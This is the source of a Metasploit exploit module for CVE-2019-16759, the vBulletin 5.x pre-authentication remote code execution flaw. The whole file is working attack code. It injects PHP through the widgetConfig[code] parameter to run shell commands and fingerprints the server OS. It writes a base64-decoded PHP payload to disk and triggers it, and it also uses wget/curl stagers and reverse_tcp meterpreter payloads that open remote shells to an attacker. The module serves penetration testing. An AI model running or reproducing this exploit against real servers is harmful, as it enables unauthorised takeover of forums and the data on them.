##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'vBulletin 5.x pre-auth RCE',
      'Description' => %q{
        vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code]
        parameter in an ajax/render/widget_php routestring request.
      },
      'Author' => [
        # discovered by an unknown sender.
        'mekhalleh (RAMELLA Sébastien)' # this module.
      ],
      'References' => [
        ['CVE', '2019-16759'],
        ['URL', 'https://seclists.org/fulldisclosure/2019/Sep/31']
      ],
      'DisclosureDate' => '2019-09-23',
      'License' => MSF_LICENSE,
      'Platform' => ['linux', 'php', 'unix', 'windows'],
      'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X86, ARCH_X64],
      'Privileged' => true,
      'Targets' => [
        ['Automatic (Dropper)',
          'Platform' => 'php',
          'Arch' => [ARCH_PHP],
          'Type' => :php_dropper,
          'DefaultOptions' => {
            'PAYLOAD' => 'php/meterpreter/reverse_tcp'
          }
        ],
        ['Linux (Stager)',
          'Platform' => 'linux',
          'Arch' => [ARCH_X86, ARCH_X64],
          'Type' => :linux_stager,
          'CmdStagerFlavor' => ['wget', 'curl'],
          'DefaultOptions' => {
            'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
            'CMDSTAGER::FLAVOR' => 'wget'
          }
        ],
        ['Windows (Stager)',
          'Platform' => 'windows',
          'Arch' => [ARCH_X86, ARCH_X64],
          'Type' => :windows_stager,
          'DefaultOptions' => {'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'}
        ],
        ['Unix (In-Memory)',
          'Platform' => 'unix',
          'Arch' => ARCH_CMD,
          'Type' => :unix_memory,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/generic'
          }
        ],
        ['Windows (In-Memory)',
          'Platform' => 'windows',
          'Arch' => ARCH_CMD,
          'Type' => :windows_memory,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/windows/generic'
          }
        ],
      ],
      'DefaultTarget' => 0,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the vBulletin base path', '/']),
      OptEnum.new('PHP_CMD', [true, 'Specify the PHP function in which you want execute the payload.', 'shell_exec', ['shell_exec', 'exec']])
    ])
  end

  def execute_command(command, _opts = {})
    response = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'encode_params' => true,
      'vars_post' => {
        'routestring' => 'ajax/render/widget_php',
        'widgetConfig[code]' => "echo #{datastore['PHP_CMD']}('#{command}'); exit;"
      }
    })
    if (response) && (response.body)
      return response
    end

    return false
  end

  def get_os
    received = execute_command('echo $PATH')
    ## Not linux, check Windows.
    if(received.body.include?('$PATH'))
      received = execute_command('echo %PATH%')
    end

    os = false
    if(received.body =~ /^\//)
      os = 'linux'
    elsif(received.body =~ /^[a-zA-Z]:\\/)
      os = 'windows'
    end

    return(os)
  end

  def check
    rand_str = Rex::Text.rand_text_alpha(8)
    received = execute_command("echo #{rand_str}")
    if (received) && (received.body.include?(rand_str))
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    unless check.eql? Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
    end
    vprint_good("The target appears to be vulnerable.")

    case target['Type']
    when :unix_memory, :windows_memory
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      received = execute_command(payload.encoded)
      if (received) && (datastore['PAYLOAD'] == "cmd/#{target['Platform']}/generic")
        print_warning('Dumping command output in body response')
        if received.body.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line("#{received.body}")
      end
    when :php_dropper
      unless os = get_os
        print_bad('Could not determine the targeted operating system.')
        return Msf::Exploit::Failed
      end
      print_status("Targeted operating system is: #{os}")

      file_name = '.' + Rex::Text.rand_text_alpha(4) + '.php'
      case(os)
      when /linux/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d > #{file_name}"
      when /windows/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} > #{file_name}.b64 & certutil -decode #{file_name}.b64 #{file_name} & del #{file_name}.b64"
      end
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{cmd}")

      received = execute_command(cmd)
      unless received
        print_error('Payload upload failed :(')
        return Msf::Exploit::Failed
      end
      print_status("Payload uploaded as: #{file_name}")
      register_file_for_cleanup file_name

      ## Triggering.
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, file_name)
      }, 2.5)
    when :linux_stager, :windows_stager
      print_status("Sending #{datastore['PAYLOAD']} command stager")
      execute_cmdstager
    end
  end

end
